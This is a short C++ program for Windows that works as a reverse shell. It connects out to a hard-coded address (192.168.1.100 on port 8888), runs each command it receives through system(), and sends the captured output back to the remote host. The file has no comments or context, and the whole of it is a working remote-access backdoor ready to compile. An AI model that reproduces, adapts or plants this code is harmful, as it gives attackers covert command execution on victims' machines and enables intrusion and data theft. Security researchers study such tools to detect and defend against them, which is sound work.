#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <sstream>
#include <fstream>
#include <direct.h>

#pragma comment(lib, "Ws2_32.lib")

#define PORT 8888
#define SERVER_IP "192.168.1.100"

int main()
{
	_chdir("C:\\Users\\");

	WSADATA ws;
	if (WSAStartup(MAKEWORD(2, 2), &ws) == SOCKET_ERROR)
	{
		std::cerr << "WSA failed" << std::endl;
		return 1;
	}

	SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (client == INVALID_SOCKET)
	{
		std::cerr << "Socket failed " << std::endl;
		WSACleanup();
		return 1;
	}

	struct sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(PORT);
	inet_pton(AF_INET, SERVER_IP, &servAddr.sin_addr);

	if (connect(client, (const sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
	{
		std::cerr << "Connected error" << std::endl;
		closesocket(client);
		WSACleanup();
		return 1;
	}
	else
	{
		while (true)
		{
			char buffer[255] = { 0 };
			if (recv(client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
			{
				std::string str = std::string() +  buffer + " > out.txt 2>&1";
				system(str.c_str());

				std::ifstream file("out.txt");
				std::stringstream output;
				output << file.rdbuf();

				file.close();
				remove("out.txt");
				if (output.str().size() > 0)
				{
					send(client, output.str().c_str(), output.str().size(), 0);
				}
				else
				{
					char t[25] = "Ready";
					send(client, t, sizeof(t), 0);
				}
			}
		}
	}
	
	closesocket(client);
	WSACleanup();

	return 0;
}